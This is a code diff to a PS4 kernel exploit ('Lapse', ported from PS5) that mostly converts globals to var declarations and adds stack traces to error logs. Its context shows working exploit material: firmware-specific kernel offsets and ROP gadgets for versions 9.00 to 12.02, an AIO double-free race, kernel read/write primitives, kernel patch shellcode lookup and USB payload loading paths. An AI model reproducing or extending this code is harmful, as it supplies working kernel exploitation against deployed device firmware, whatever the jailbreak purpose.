@@ -4,41 +4,30 @@
 // PS4 Lapse Configuration
 // Ported from PS5 version for Netflix n Hack
 
-FW_VERSION = "";
-IS_PS4 = true;
+var FW_VERSION = "";
+var IS_PS4 = true;
 
-PAGE_SIZE = 0x4000;
-PHYS_PAGE_SIZE = 0x1000;
+var PAGE_SIZE = 0x4000;
+var PHYS_PAGE_SIZE = 0x1000;
 
-LIBKERNEL_HANDLE = 0x2001n;
+var LIBKERNEL_HANDLE = 0x2001n;
 
-// Socket constants - only define if not already in scope
-// (inject.js defines some of these as const in the eval scope)
-if (typeof AF_UNIX === 'undefined') AF_UNIX = 1n;
-if (typeof AF_INET === 'undefined') AF_INET = 2n;
-if (typeof AF_INET6 === 'undefined') AF_INET6 = 28n;
+// Socket constants (only ones not in inject_auto.js)
+// Already in inject_auto.js: AF_INET, AF_INET6, SOCK_STREAM, SOCK_DGRAM,
+//   IPPROTO_UDP, IPPROTO_IPV6, IPV6_PKTINFO, SOL_SOCKET, SO_REUSEADDR
+var AF_UNIX = 1n;
+var IPPROTO_TCP = 6n;
+var SO_LINGER = 0x80n;
 
-if (typeof SOCK_STREAM === 'undefined') SOCK_STREAM = 1n;
-if (typeof SOCK_DGRAM === 'undefined') SOCK_DGRAM = 2n;
-
-if (typeof IPPROTO_TCP === 'undefined') IPPROTO_TCP = 6n;
-if (typeof IPPROTO_UDP === 'undefined') IPPROTO_UDP = 17n;
-if (typeof IPPROTO_IPV6 === 'undefined') IPPROTO_IPV6 = 41n;
-
-if (typeof SOL_SOCKET === 'undefined') SOL_SOCKET = 0xFFFFn;
-if (typeof SO_REUSEADDR === 'undefined') SO_REUSEADDR = 4n;
-if (typeof SO_LINGER === 'undefined') SO_LINGER = 0x80n;
-
-// IPv6 socket options
-if (typeof IPV6_PKTINFO === 'undefined') IPV6_PKTINFO = 46n;
-if (typeof IPV6_NEXTHOP === 'undefined') IPV6_NEXTHOP = 48n;
-if (typeof IPV6_RTHDR === 'undefined') IPV6_RTHDR = 51n;
-if (typeof IPV6_TCLASS === 'undefined') IPV6_TCLASS = 61n;
-if (typeof IPV6_2292PKTOPTIONS === 'undefined') IPV6_2292PKTOPTIONS = 25n;
+// IPv6 socket options (IPV6_PKTINFO already in inject_auto.js)
+var IPV6_NEXTHOP = 48n;
+var IPV6_RTHDR = 51n;
+var IPV6_TCLASS = 61n;
+var IPV6_2292PKTOPTIONS = 25n;
 
 // TCP socket options
-if (typeof TCP_INFO === 'undefined') TCP_INFO = 32n;
-if (typeof TCPS_ESTABLISHED === 'undefined') TCPS_ESTABLISHED = 4n;
+var TCP_INFO = 32n;
+var TCPS_ESTABLISHED = 4n;
 
 // All syscalls from lapse.py (PS4)
 // (SYSCALL object is already defined in inject.js, we just add properties)
@@ -78,49 +67,49 @@ SYSCALL.aio_multi_cancel = 0x29An;  // 666
 SYSCALL.aio_submit_cmd = 0x29Dn;    // 669
 SYSCALL.kexec = 0x295n;             // 661
 
-MAIN_CORE = 4;  // Same as yarpe
-MAIN_RTPRIO = 0x100;
-NUM_WORKERS = 2;
-NUM_GROOMS = 0x200;
-NUM_HANDLES = 0x100;
-NUM_SDS = 64;
-NUM_SDS_ALT = 48;
-NUM_RACES = 100;
-NUM_ALIAS = 100;
-LEAK_LEN = 16;
-NUM_LEAKS = 32;
-NUM_CLOBBERS = 8;
-MAX_AIO_IDS = 0x80;
+var MAIN_CORE = 4;  // Same as yarpe
+var MAIN_RTPRIO = 0x100;
+var NUM_WORKERS = 2;
+var NUM_GROOMS = 0x200;
+var NUM_HANDLES = 0x100;
+var NUM_SDS = 64;
+var NUM_SDS_ALT = 48;
+var NUM_RACES = 100;
+var NUM_ALIAS = 100;
+var LEAK_LEN = 16;
+var NUM_LEAKS = 32;
+var NUM_CLOBBERS = 8;
+var MAX_AIO_IDS = 0x80;
 
-AIO_CMD_READ = 1n;
-AIO_CMD_FLAG_MULTI = 0x1000n;
-AIO_CMD_MULTI_READ = 0x1001n;
-AIO_CMD_WRITE = 2n;
-AIO_STATE_COMPLETE = 3n;
-AIO_STATE_ABORTED = 4n;
+var AIO_CMD_READ = 1n;
+var AIO_CMD_FLAG_MULTI = 0x1000n;
+var AIO_CMD_MULTI_READ = 0x1001n;
+var AIO_CMD_WRITE = 2n;
+var AIO_STATE_COMPLETE = 3n;
+var AIO_STATE_ABORTED = 4n;
 
-SCE_KERNEL_ERROR_ESRCH = 0x80020003n;
+var SCE_KERNEL_ERROR_ESRCH = 0x80020003n;
 
-RTP_SET = 1n;
-PRI_REALTIME = 2n;
+var RTP_SET = 1n;
+var PRI_REALTIME = 2n;
 
 // TCP info structure size for getsockopt
-size_tcp_info = 0xEC;
+var size_tcp_info = 0xEC;
 
-block_fd = 0xffffffffffffffffn;
-unblock_fd = 0xffffffffffffffffn;
-block_id = -1n;
-groom_ids = null;
-sds = null;
-sds_alt = null;
-prev_core = -1;
-prev_rtprio = 0n;
-ready_signal = 0n;
-deletion_signal = 0n;
-pipe_buf = 0n;
+var block_fd = 0xffffffffffffffffn;
+var unblock_fd = 0xffffffffffffffffn;
+var block_id = -1n;
+var groom_ids = null;
+var sds = null;
+var sds_alt = null;
+var prev_core = -1;
+var prev_rtprio = 0n;
+var ready_signal = 0n;
+var deletion_signal = 0n;
+var pipe_buf = 0n;
 
-saved_fpu_ctrl = 0;
-saved_mxcsr = 0;
+var saved_fpu_ctrl = 0;
+var saved_mxcsr = 0;
 
 function sysctlbyname(name, oldp, oldp_len, newp, newp_len) {
     const translate_name_mib = malloc(0x8);
@@ -223,7 +212,7 @@ function get_kpatch_shellcode(fw_version) {
 
 // Firmware-specific offsets for PS4
 
-offset_ps4_9_00 = {
+var offset_ps4_9_00 = {
     EVF_OFFSET: 0x7F6F27n,
     PRISON0: 0x111F870n,
     ROOTVNODE: 0x21EFF20n,
@@ -232,7 +221,7 @@ offset_ps4_9_00 = {
     JMP_RSI_GADGET: 0x4C7ADn,
 };
 
-offset_ps4_9_03 = {
+var offset_ps4_9_03 = {
     EVF_OFFSET: 0x7F4CE7n,
     PRISON0: 0x111B840n,
     ROOTVNODE: 0x21EBF20n,
@@ -241,7 +230,7 @@ offset_ps4_9_03 = {
     JMP_RSI_GADGET: 0x5325Bn,
 };
 
-offset_ps4_9_50 = {
+var offset_ps4_9_50 = {
     EVF_OFFSET: 0x769A88n,
     PRISON0: 0x11137D0n,
     ROOTVNODE: 0x21A6C30n,
@@ -250,7 +239,7 @@ offset_ps4_9_50 = {
     JMP_RSI_GADGET: 0x15A6Dn,
 };
 
-offset_ps4_10_00 = {
+var offset_ps4_10_00 = {
     EVF_OFFSET: 0x7B5133n,
     PRISON0: 0x111B8B0n,
     ROOTVNODE: 0x1B25BD0n,
@@ -259,7 +248,7 @@ offset_ps4_10_00 = {
     JMP_RSI_GADGET: 0x68B1n,
 };
 
-offset_ps4_10_50 = {
+var offset_ps4_10_50 = {
     EVF_OFFSET: 0x7A7B14n,
     PRISON0: 0x111B910n,
     ROOTVNODE: 0x1BF81F0n,
@@ -268,7 +257,7 @@ offset_ps4_10_50 = {
     JMP_RSI_GADGET: 0x50DEDn,
 };
 
-offset_ps4_11_00 = {
+var offset_ps4_11_00 = {
     EVF_OFFSET: 0x7FC26Fn,
     PRISON0: 0x111F830n,
     ROOTVNODE: 0x2116640n,
@@ -277,7 +266,7 @@ offset_ps4_11_00 = {
     JMP_RSI_GADGET: 0x71A21n,
 };
 
-offset_ps4_11_02 = {
+var offset_ps4_11_02 = {
     EVF_OFFSET: 0x7FC22Fn,
     PRISON0: 0x111F830n,
     ROOTVNODE: 0x2116640n,
@@ -286,7 +275,7 @@ offset_ps4_11_02 = {
     JMP_RSI_GADGET: 0x71A21n,
 };
 
-offset_ps4_11_50 = {
+var offset_ps4_11_50 = {
     EVF_OFFSET: 0x784318n,
     PRISON0: 0x111FA18n,
     ROOTVNODE: 0x2136E90n,
@@ -295,7 +284,7 @@ offset_ps4_11_50 = {
     JMP_RSI_GADGET: 0x704D5n,
 };
 
-offset_ps4_12_00 = {
+var offset_ps4_12_00 = {
     EVF_OFFSET: 0x784798n,
     PRISON0: 0x111FA18n,
     ROOTVNODE: 0x2136E90n,
@@ -305,7 +294,7 @@ offset_ps4_12_00 = {
 };
 
 // Map firmware versions to offset objects
-ps4_kernel_offset_list = {
+var ps4_kernel_offset_list = {
     "9.00": offset_ps4_9_00,
     "9.03": offset_ps4_9_03,
     "9.04": offset_ps4_9_03,
@@ -325,7 +314,7 @@ ps4_kernel_offset_list = {
     "12.02": offset_ps4_12_00,
 };
 
-kernel_offset = null;
+var kernel_offset = null;
 
 function get_kernel_offset(FW_VERSION) {
     const fw_offsets = ps4_kernel_offset_list[FW_VERSION];
@@ -595,7 +584,7 @@ function write_file(path, text) {
 // PS4 Kernel Read/Write primitives
 // Ported from PS5 version - adjusted for PS4 structure offsets
 
-kernel = {
+var kernel = {
     addr: {},
     copyout: null,
     copyin: null,
@@ -698,7 +687,7 @@ kernel.write_qword = function(dest, value) {
 };
 
 // IPv6 kernel r/w primitive
-ipv6_kernel_rw = {
+var ipv6_kernel_rw = {
     data: {},
     ofiles: null,
     kread8: null,
@@ -1488,7 +1477,7 @@ function setup() {
         return true;
 
     } catch (e) {
-        logger.log("  Setup failed: " + e.message);
+        logger.log("  Setup failed: " + e.message + "\n" + e.stack);
         return false;
     }
 }
@@ -1575,7 +1564,7 @@ function double_free_reqs2() {
         return null;
 
     } catch (e) {
-        logger.log("  Race error: " + e.message);
+        logger.log("  Race error: " + e.message + "\n" + e.stack);
         return null;
     }
 }
@@ -1752,7 +1741,7 @@ function race_one(req_addr, tcp_sd, sds) {
         return null;
 
     } catch (e) {
-        logger.log("  race_one error: " + e.message);
+        logger.log("  race_one error: " + e.message + "\n" + e.stack);
         return null;
     }
 }
@@ -2703,7 +2692,7 @@ function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio
                     all_patches_ok = false;
                 }
             } catch (e) {
-                logger.log("  [FAIL] mmap RWX test error: " + e.message);
+                logger.log("  [FAIL] mmap RWX test error: " + e.message + "\n" + e.stack);
                 all_patches_ok = false;
             }
 
@@ -2832,12 +2821,12 @@ const BL_SYSCALL = {
     is_in_sandbox: 0x249,
 };
 
-// File open flags (use conditional to avoid redeclaration when bundled)
-if (typeof BL_O_RDONLY === 'undefined') BL_O_RDONLY = 0n;
-if (typeof BL_O_WRONLY === 'undefined') BL_O_WRONLY = 1n;
-if (typeof BL_O_RDWR === 'undefined') BL_O_RDWR = 2n;
-if (typeof BL_O_CREAT === 'undefined') BL_O_CREAT = 0x200n;
-if (typeof BL_O_TRUNC === 'undefined') BL_O_TRUNC = 0x400n;
+// File open flags
+var BL_O_RDONLY = 0n;
+var BL_O_WRONLY = 1n;
+var BL_O_RDWR = 2n;
+var BL_O_CREAT = 0x200n;
+var BL_O_TRUNC = 0x400n;
 
 // USB and data paths (check usb0-usb4 like BD-JB does)
 const USB_PAYLOAD_PATHS = [
